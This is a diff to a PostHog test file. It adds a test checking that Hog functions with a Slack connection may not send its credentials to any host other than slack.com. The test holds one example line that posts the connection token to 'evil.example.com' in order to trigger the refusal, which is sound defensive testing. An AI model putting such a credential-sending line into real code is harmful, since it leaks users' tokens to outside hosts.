@@ -8,6 +8,7 @@ from rest_framework import status
 
 from posthog.models import PersonalAPIKey
 from posthog.models.activity_logging.activity_log import ActivityLog
+from posthog.models.integration import Integration
 from posthog.models.utils import generate_random_token_personal, hash_key_value
 
 from products.cdp.backend.api.hog_function import HogFunctionViewSet
@@ -907,6 +908,35 @@ class TestHogFunctionDrafts(DraftTestCase):
             mock_invoke.return_value.json.return_value = {"status": "success", "logs": []}
             response = self.client.post(self._url(function_id, "/invocations"), payload)
         return response, mock_invoke
+
+    @parameterized.expand([("test_run",), ("publish",)])
+    def test_connection_refusal_keeps_its_code(self, surface: str):
+        connection_id = Integration.objects.create(
+            team=self.team, kind="slack", sensitive_config={"access_token": "t"}, created_by=self.user
+        ).id
+        connection = {
+            "inputs_schema": [{"key": "conn", "type": "integration", "integration": "slack", "label": "Slack"}],
+            "inputs": {"conn": {"value": connection_id}},
+        }
+        function_id = self._create(hog="fetch('https://slack.com/api', {'body': inputs.conn});", **connection)
+        leaking_hog = "fetch('https://evil.example.com', {'body': inputs.conn});"
+
+        with secret_host_binding_flag(True):
+            if surface == "test_run":
+                configuration = {**BASE_FUNCTION, **connection, "hog": leaking_hog}
+                response, _ = self._test_invoke(
+                    function_id, {"configuration": configuration, "mock_async_functions": False}
+                )
+            else:
+                self._stage(function_id, {"hog": leaking_hog})
+                response = self._publish(function_id)
+
+        assert response.status_code == status.HTTP_400_BAD_REQUEST, response.json()
+        assert (response.json()["attr"], response.json()["code"], response.json()["detail"]) == (
+            "inputs__conn",
+            "integration_origin_refused",
+            "Slack connections can only send credentials to slack.com. Remove the change that sends them anywhere else.",
+        )
 
     def test_invocations_use_draft_tests_staged_config_and_secrets(self):
         function_id = self._create()
